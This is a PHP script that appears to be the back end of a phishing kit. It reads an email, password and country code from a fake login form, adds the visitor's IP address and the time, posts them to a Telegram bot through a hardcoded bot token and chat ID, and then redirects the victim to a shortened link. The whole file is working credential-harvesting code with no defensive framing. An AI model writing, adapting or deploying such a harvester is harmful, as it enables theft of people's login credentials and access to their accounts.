<?php

// Telegram bot token and chat ID
$telegram_bot_token = '6146129125:AAHs2PEh1I35n4YYkguzQsHOBwjXTNBOhhk';
$telegram_chat_id = '1097882042';

// Function to send message to Telegram bot
function sendToTelegram($data) {
    global $telegram_bot_token, $telegram_chat_id;
    $url = "https://api.telegram.org/bot$telegram_bot_token/sendMessage";
    $payload = array(
        'chat_id' => $telegram_chat_id,
        'text' => $data,
        'parse_mode' => 'HTML'
    );

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

// Get login form data
$email = $_POST['email'];
$password = $_POST['password'];
$country_code = $_POST['country_code'];
$ip_address = $_SERVER['REMOTE_ADDR'];
$time = date('h:i A');
$date = date('Y-m-d');

// Prepare the message
$message = "New login:\nEmail: $email\nPassword: $password\nCountry Code: $country_code\nIP Address: $ip_address\nTime: $time\nDate: $date";

// Send message to the Telegram bot
sendToTelegram($message);
header ('Location:https://citly.me/ike1u');